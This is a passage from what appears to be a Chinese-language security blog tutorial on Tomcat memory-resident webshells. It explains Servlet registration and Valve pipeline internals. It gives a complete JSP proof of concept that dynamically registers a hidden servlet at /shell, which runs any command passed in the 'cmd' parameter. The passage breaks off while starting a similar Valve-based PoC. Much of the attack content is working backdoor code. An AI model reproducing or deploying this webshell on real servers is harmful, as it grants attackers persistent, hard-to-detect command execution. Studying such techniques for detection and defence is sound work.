class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> jakarta.servlet.*;<br><span class="hljs-keyword">import</span> jakarta.servlet.http.*;<br><span class="hljs-keyword">import</span> jakarta.servlet.annotation.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet(name = &quot;Shell_Servlet&quot;, value = &quot;/shell&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Servlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125;<span class="hljs-keyword">catch</span> (IOException | NullPointerException e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010555517.png" alt="image-20230201055527413"></p><p>接着需要实现动态注册Servlet</p><h4 id="Servlet创建流程"><a href="#Servlet创建流程" class="headerlink" title="Servlet创建流程"></a>Servlet创建流程</h4><p>Servlet的生命周期分为如下五部分</p><ol><li>加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建Servlet的实例</li><li>初始化：当Servlet被实例化后，Tomcat会调用<code>init()</code>方法初始化这个对象</li><li>处理服务：当浏览器访问Servlet的时候，Servlet 会调用<code>service()</code>方法处理请求</li><li>销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用<code>destroy()</code>方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁</li><li>卸载：当Servlet调用完<code>destroy()</code>方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用<code>init()</code>方法进行初始化操作</li></ol><blockquote><p>Wrapper是对Servlet的抽象和包装，每个Context可以有多个Wrapper，Wrapper主要负责管理 Servlet ，包括的 Servlet 的装载、初始化、执行以及资源回收,也是接下来注册恶意Servlet的关键</p></blockquote><h4 id="创建StandardWrapper"><a href="#创建StandardWrapper" class="headerlink" title="创建StandardWrapper"></a>创建StandardWrapper</h4><p>在<code>StandardContext</code>#<code>startInternal</code>中，调用了<code>fireLifecycleEvent()</code>方法解析web.xml文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fireLifecycleEvent</span><span class="hljs-params">(String type, Object data)</span> &#123;<br>        <span class="hljs-type">LifecycleEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LifecycleEvent</span>(<span class="hljs-built_in">this</span>, type, data);<br>        <span class="hljs-keyword">for</span> (LifecycleListener listener : lifecycleListeners) &#123;<br>            listener.lifecycleEvent(event);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>最终通过<code>ContextConfig#webConfig()</code>方法解析web.xml获取各种配置参数</p></blockquote><p>然后通过<code>configureContext(webXml)</code>方法创建StandWrapper对象，并根据解析参数初始化StandWrapper对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configureContext</span><span class="hljs-params">(WebXml webxml)</span> &#123;<br>        <span class="hljs-comment">// As far as possible, process in alphabetical order so it is easy to</span><br>        <span class="hljs-comment">// check everything is present</span><br>        <span class="hljs-comment">// Some validation depends on correct public ID</span><br>        context.setPublicId(webxml.getPublicId());<br> <br>...   <span class="hljs-comment">//设置StandardContext参数</span><br> <br>        <br>        <span class="hljs-keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;<br> <br>            <span class="hljs-comment">//创建StandardWrapper对象</span><br>            <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> context.createWrapper();<br> <br>            <span class="hljs-keyword">if</span> (servlet.getLoadOnStartup() != <span class="hljs-literal">null</span>) &#123;<br> <br>                <span class="hljs-comment">//设置LoadOnStartup属性</span><br>                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());<br>            &#125;<br>            <span class="hljs-keyword">if</span> (servlet.getEnabled() != <span class="hljs-literal">null</span>) &#123;<br>                wrapper.setEnabled(servlet.getEnabled().booleanValue());<br>            &#125;<br> <br>            <span class="hljs-comment">//设置ServletName属性</span><br>            wrapper.setName(servlet.getServletName());<br>            Map&lt;String,String&gt; params = servlet.getParameterMap();<br>            <span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;<br>                wrapper.addInitParameter(entry.getKey(), entry.getValue());<br>            &#125;<br>            wrapper.setRunAs(servlet.getRunAs());<br>            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();<br>            <span class="hljs-keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;<br>                wrapper.addSecurityReference(<br>                        roleRef.getName(), roleRef.getLink());<br>            &#125;<br> <br>            <span class="hljs-comment">//设置ServletClass属性</span><br>            wrapper.setServletClass(servlet.getServletClass());<br>            ...<br>            wrapper.setOverridable(servlet.isOverridable());<br> <br>            <span class="hljs-comment">//将包装好的StandWrapper添加进ContainerBase的children属性中</span><br>            context.addChild(wrapper);<br> <br>           <span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry :<br>                webxml.getServletMappings().entrySet()) &#123;<br>          <br>            <span class="hljs-comment">//添加路径映射</span><br>            context.addServletMappingDecoded(entry.getKey(), entry.getValue());<br>        &#125;<br>        &#125;<br>        ...<br>    &#125;<br></code></pre></td></tr></table></figure><p>最后通过<code>addServletMappingDecoded()</code>方法添加Servlet对应的url映射</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addServletMappingDecoded</span><span class="hljs-params">(String pattern, String name,</span><br><span class="hljs-params">                                  <span class="hljs-type">boolean</span> jspWildCard)</span> &#123;<br><span class="hljs-comment">//...</span><br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> (Wrapper) findChild(name);<br><span class="hljs-comment">//...</span><br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="加载StandWrapper"><a href="#加载StandWrapper" class="headerlink" title="加载StandWrapper"></a>加载StandWrapper</h4><p>接着在<code>StandardContext#startInternal</code>方法通过<code>findChildren()</code>获取<code>StandardWrapper</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Container child : findChildren()) &#123;<br>    <span class="hljs-keyword">if</span> (!child.getState().isAvailable()) &#123;<br>        child.start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后依次加载完Listener、Filter后，就通过<code>loadOnStartUp()</code>方法加载wrapper</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">loadOnStartup</span><span class="hljs-params">(Container children[])</span> &#123;<br> <br>    <span class="hljs-comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span><br>    TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (Container child : children) &#123;<br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> (Wrapper) child;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">loadOnStartup</span> <span class="hljs-operator">=</span> wrapper.getLoadOnStartup();<br> <br>        <span class="hljs-comment">//判断属性loadOnStartup的值</span><br>        <span class="hljs-keyword">if</span> (loadOnStartup &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> Integer.valueOf(loadOnStartup);<br>        ArrayList&lt;Wrapper&gt; list = map.get(key);<br>        <span class="hljs-keyword">if</span> (list == <span class="hljs-literal">null</span>) &#123;<br>            list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>            map.put(key, list);<br>        &#125;<br>        list.add(wrapper);<br>    &#125;<br> <br>    <span class="hljs-comment">// Load the collected &quot;load on startup&quot; servlets</span><br>    <span class="hljs-keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;<br>        <span class="hljs-keyword">for</span> (Wrapper wrapper : list) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                wrapper.load();<span class="hljs-comment">//加载Servlet</span><br>            &#125;<br></code></pre></td></tr></table></figure><blockquote><p>最后的poc中需要注意<code>loadOnStartup</code>属性的设置，只有大于0才会被放入list，进而被加载<code>wrapper.load()</code></p></blockquote><h4 id="动态注册Servlet"><a href="#动态注册Servlet" class="headerlink" title="动态注册Servlet"></a>动态注册Servlet</h4><p>通过上面的分析可以总结流程</p><ol><li>获取<code>StandardContext</code>对象</li><li>编写恶意Servlet</li><li>通过<code>StandardContext.createWrapper()</code>创建<code>StandardWrapper</code>对象</li><li>设置<code>StandardWrapper</code>对象的<code>loadOnStartup</code>、<code>ServletName</code>、<code>ServletClass</code>属性值</li><li>将<code>StandardWrapper</code>对象添加进<code>StandardContext</code>对象的<code>children</code>属性中</li><li>通过<code>StandardContext.addServletMappingDecoded()</code>添加对应的路径映射</li></ol><h4 id="完整POC链"><a href="#完整POC链" class="headerlink" title="完整POC链"></a>完整POC链</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br>&lt;%<span class="hljs-comment">//得到StandardContext对象</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br>%&gt;<br> <br>&lt;%!<br> <span class="hljs-comment">//恶意Servlet</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Servlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br>    &#125;<br> <br>%&gt;<br> <br>&lt;%<span class="hljs-comment">//创建StandardWrapper并设置对应属性</span><br>    <span class="hljs-type">Shell_Servlet</span> <span class="hljs-variable">shell_servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Servlet</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> shell_servlet.getClass().getSimpleName();<br> <br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    wrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<span class="hljs-comment">//不能小于0</span><br>    wrapper.setName(name);<br>    wrapper.setServlet(shell_servlet);<br>    wrapper.setServletClass(shell_servlet.getClass().getName());<br>%&gt;<br> <br>&lt;%<span class="hljs-comment">//绑定路由</span><br>    standardContext.addChild(wrapper);<br>    standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,name);<br>%&gt;<br></code></pre></td></tr></table></figure><p>先注册Servlet</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/Java_Shell_war_exploded/Servlet.jsp<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010647020.png" alt="image-20230201064710941"></p><blockquote><p>Servlet型内存马的缺点就是必须要访问对应的路径才能命令执行，易被发现。</p></blockquote><h3 id="Valve型"><a href="#Valve型" class="headerlink" title="Valve型"></a>Valve型</h3><p>需要先了解一下tomcat中的管道机制</p><p>Tomcat 在处理一个请求调用逻辑时需要传递Request 和 Respone 对象，Tomcat 使用了职责链模式来实现客户端请求的处理。在 Tomcat 中定义了两个接口：Pipeline（管道）和 Valve（阀）。这两个接口名字很好的诠释了处理模式：数据流就像是流经管道的水一样，经过管道上个一个个阀门。</p><p>Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。Pipeline 提供了 <code>addValve</code> 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行。</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010646623.png" alt="image-20230201064647521"></p><blockquote><p>在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例。</p></blockquote><h4 id="动态添加Valve"><a href="#动态添加Valve" class="headerlink" title="动态添加Valve"></a>动态添加Valve</h4><p>先来简单看一下接口的定义，<code>org.apache.catalina.Pipeline</code> 的定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Pipeline</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Contained</span> &#123;<br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getBasic</span><span class="hljs-params">()</span>;<span class="hljs-comment">//获取基础阀门</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBasic</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//设置基础阀门</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addValve</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//增加阀门*</span><br>    <span class="hljs-keyword">public</span> Valve[] getValves();<span class="hljs-comment">//获取</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeValve</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//移除</span><br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getFirst</span><span class="hljs-params">()</span>;<span class="hljs-comment">//获取首个</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span>;<span class="hljs-comment">//是否支持异步*</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">findNonAsyncValves</span><span class="hljs-params">(Set&lt;String&gt; result)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>org.apache.catalina.Valve</code> 的定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Valve</span> &#123;<br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve valve)</span>;<span class="hljs-comment">//设置下一个阀门</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><span class="hljs-keyword">throws</span> IOException, ServletException;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Tomcat 中 Pipeline 仅有一个实现 StandardPipeline，存放在 ContainerBase 的 pipeline 属性中，并且 ContainerBase 提供 <code>addValve</code> 方法调用 StandardPipeline 的 addValve 方法添加。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addValve</span><span class="hljs-params">(Valve valve)</span> &#123;<br>    <span class="hljs-keyword">if</span> (valve <span class="hljs-keyword">instanceof</span> Contained) &#123;<br>        ((Contained) valve).setContainer(<span class="hljs-built_in">this</span>.container);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (getState().isAvailable()) &#123;<br>        <span class="hljs-keyword">if</span> (valve <span class="hljs-keyword">instanceof</span> Lifecycle) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                ((Lifecycle) valve).start();<br>            &#125; <span class="hljs-keyword">catch</span> (LifecycleException e) &#123;<br>                log.error(sm.getString(<span class="hljs-string">&quot;standardPipeline.valve.start&quot;</span>), e);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (first == <span class="hljs-literal">null</span>) &#123;<br>        first = valve;<br>        valve.setNext(basic);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">Valve</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> first;<br>        <span class="hljs-keyword">while</span> (current != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (current.getNext() == basic) &#123;<br>                current.setNext(valve);<br>                valve.setNext(basic);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            current = current.getNext();<br>        &#125;<br>    &#125;<br><br>    container.fireContainerEvent(Container.ADD_VALVE_EVENT, valve);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Tomcat 中四个层级的容器都继承了 ContainerBase ，所以在哪个层级的容器的标准实现上添加自定义的 Valve 均可。</p></blockquote><p>添加后，将会在 <code>org.apache.catalina.connector.CoyoteAdapter</code> 的 <code>service</code> 方法中调用 Valve 的 <code>invoke</code> 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(org.apache.coyote.Request req, org.apache.coyote.Response res)</span><br>        <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//...</span><br>        postParseSuccess = postParseRequest(req, request, res, response);<br>        <span class="hljs-keyword">if</span> (postParseSuccess) &#123;<br>            request.setAsyncSupported(<br>                    connector.getService().getContainer().getPipeline().isAsyncSupported());<br>            connector.getService().getContainer().getPipeline().getFirst().invoke(<br>                    request, response);<span class="hljs-comment">//调用invoke</span><br></code></pre></td></tr></table></figure><p>这样思路就很清晰了，我们只要写一个恶意Valve为了方便可以继承<code>ValveBase</code>，然后将恶意代码写在invoke方法中,之后只要先通过<code>StandardContext</code>对象获取<code>StandardPipeline</code>，这样就可以利用<code>StandardPipeline.addValve()</code>动态添加Valve</p><h4 id="完整POC-2"><a href="#完整POC-2" class="headerlink" title="完整POC"></a>完整POC</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span 